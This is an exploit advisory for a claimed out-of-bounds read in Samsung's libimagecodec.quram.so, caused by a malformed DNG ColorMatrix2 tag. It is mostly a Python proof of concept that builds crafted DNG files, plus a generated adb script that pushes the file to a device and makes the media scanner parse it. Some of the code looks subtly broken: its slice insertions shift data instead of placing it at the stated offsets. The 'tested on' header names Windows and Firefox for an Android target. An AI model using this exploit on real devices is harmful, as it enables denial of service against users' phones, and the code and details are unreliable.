@@ -1,0 +1,164 @@
+=============================================================================================================================================
+| # Title     : Samsung libimagecodec.quram.so Out-of-Bounds Read via Malformed DNG ColorMatrix2                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.samsung.com/us/                                                                                                 |
+=============================================================================================================================================
+
+[+] Summary    : A memory safety vulnerability was identified in Samsung’s image decoding library libimagecodec.quram.so, affecting the handling of DNG (Digital Negative) image files.
+                 The issue stems from improper bounds validation when parsing the ColorMatrix2 (0xC622) tag within DNG metadata.
+                 By supplying a crafted DNG file containing a malformed ColorMatrix2 tag with an unexpected number of entries, the library incorrectly derives the number of color 
+				 planes and subsequently performs memory access beyond the allocated buffer. This results in an Out-of-Bounds Read, leading to a process crash (SIGSEGV) during image parsing.
+				 The vulnerability can be triggered automatically through the Android Media Scanner or manually by opening the malicious DNG file in gallery applications, 
+				 without requiring user interaction beyond file presence.
+                 While the observed impact is a denial of service, the flaw represents a broader risk class associated with unsafe metadata parsing in privileged media components.
+                 Samsung addressed this issue in the January 2026 security update
+  
+[+] POC :   
+
+#!/usr/bin/env python3
+
+import struct
+import os
+
+def create_malicious_dng(filename="poc.dng"):
+    """
+    Creates a malicious DNG file that causes the Samsung library to crash
+    """
+    data = bytearray()
+    data += b'II'         
+    data += struct.pack('<H', 42) 
+    data += struct.pack('<I', 8)   
+    ifd0_offset = len(data)
+    data += struct.pack('<H', 13)  
+    data += struct.pack('<HHII', 0x00FE, 4, 1, 0)
+    data += struct.pack('<HHII', 0x0100, 4, 1, 400)
+    data += struct.pack('<HHII', 0x0101, 4, 1, 400)
+    data += struct.pack('<HHII', 0x0102, 3, 1, 0x10)
+    data += struct.pack('<HHII', 0x0106, 3, 1, 32803)
+    make_data = b"External\x00"
+    data += struct.pack('<HHII', 0x010F, 2, len(make_data), 0xAA)
+    data += struct.pack('<HHII', 0x0111, 4, 400, 0xB2)
+    data += struct.pack('<HHII', 0x0116, 4, 1, 1)
+    data += struct.pack('<HHII', 0x0117, 4, 400, 0x6F2)
+    data += struct.pack('<HHII', 0x828D, 1, 2, 0x202)
+    data += struct.pack('<HHII', 0x828E, 1, 4, 0x10001)
+    data += struct.pack('<HHII', 0xC612, 1, 4, 0x4010000)
+    data += struct.pack('<HHII', 0xC622, 9, 6, 0xD32)
+    data += struct.pack('<I', 0)
+    data[0x10:0x10] = struct.pack('<H', 16)
+    data[0xAA:0xAA] = make_data
+    strip_offsets = b''
+    for i in range(400):
+        strip_offsets += struct.pack('<I', i * 800)  
+    data[0xB2:0xB2] = strip_offsets
+    data[0x202:0x202] = b'\x02\x02'
+    data[0x10001:0x10001] = b'\x01\x00\x01\x00'
+    data[0x4010000:0x4010000] = b'\x01\x04\x00\x00'
+    color_matrix = b''
+    for i in range(6):
+        color_matrix += struct.pack('<i', 1000 + i)  
+    data[0xD32:0xD32] = color_matrix
+
+    strip_counts = b''
+    for i in range(400):
+        strip_counts += struct.pack('<I', 800) 
+    data[0x6F2:0x6F2] = strip_counts
+    fake_pixel_data = b'\x00' * 320000  
+    data.extend(fake_pixel_data)
+    with open(filename, 'wb') as f:
+        f.write(data)
+    
+    print(f"[+] Malicious DNG file created: {filename}")
+    print(f"[+] Size: {len(data)} bytes")
+    
+    return filename
+
+def create_trigger_script():
+    """
+    Creates a script to trigger the vulnerability on the device
+    """
+    script = """#!/bin/bash
+echo "[*] Sending malicious DNG file to device..."
+adb push poc.dng /storage/emulated/0/DCIM/
+
+echo "[*] Triggering Media Scanner scan..."
+adb shell am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d file:///storage/emulated/0/DCIM/poc.dng
+
+echo "[*] To monitor the crash, run:"
+echo "    adb logcat | grep -A 20 -B 5 'SIGSEGV'"
+echo "    adb logcat | grep -A 30 'Fatal signal'"
+echo ""
+echo "[*] Or open the file manually in the Gallery app"
+    """
+    
+    with open("trigger_exploit.sh", "w") as f:
+        f.write(script)
+    
+    os.chmod("trigger_exploit.sh", 0o755)
+    print("[+] Execution script created: trigger_exploit.sh")
+
+def create_simple_poc():
+    """
+    A very simplified version of the malicious file
+    """
+    poc = bytearray()
+    poc += b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)
+    ifd_offset = len(poc)
+    poc += struct.pack('<H', 8)
+    poc += struct.pack('<HHII', 0x0100, 4, 1, 400)  
+    poc += struct.pack('<HHII', 0x0101, 4, 1, 400)
+    poc += struct.pack('<HHII', 0x0102, 3, 1, 16)   
+    poc += struct.pack('<HHII', 0x0106, 3, 1, 32803) 
+    poc += struct.pack('<HHII', 0x0116, 4, 1, 1)
+    poc += struct.pack('<HHII', 0x0117, 4, 400, 0x100)
+    poc += struct.pack('<HHII', 0xC612, 1, 4, 0x200)
+    poc += struct.pack('<HHII', 0xC622, 9, 6, 0x300)
+    poc += struct.pack('<I', 0)
+    poc.extend(b'\x00' * 0x300)  
+    for i in range(6):
+        poc += struct.pack('<i', 0x1000 + i)
+    poc[0x200:0x200] = b'\x01\x04\x00\x00'
+    poc[0x100:0x100] = b'\x00\x00\x03\x20' * 400  # 800 per strip
+    
+    with open("simple_poc.dng", "wb") as f:
+        f.write(poc)
+    
+    print("[+] Simplified file created: simple_poc.dng")
+    print("[!] This file might not work on all devices")
+
+def main():
+    print("=" * 60)
+    print("PoC for Samsung libimagecodec.quram.so - CVE-2026-20973")
+    print("=" * 60)
+    print()
+    print("[1] Create full malicious DNG file")
+    print("[2] Create simplified DNG file")
+    print("[3] Create execution script")
+    print()
+    
+    choice = input("Select option (1/2/3): ").strip()
+    
+    if choice == "1":
+        create_malicious_dng()
+    elif choice == "2":
+        create_simple_poc()
+    elif choice == "3":
+        create_trigger_script()
+    else:
+        print("[!] Invalid option")
+    
+    print()
+    print("=" * 60)
+    print("Notes:")
+    print("- Vulnerability patched in January 2026 update")
+    print("- CVE number: CVE-2026-20973")
+    print("- For educational and security research purposes only!")
+    print("=" * 60)
+
+if __name__ == "__main__":
+    main()
+	
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
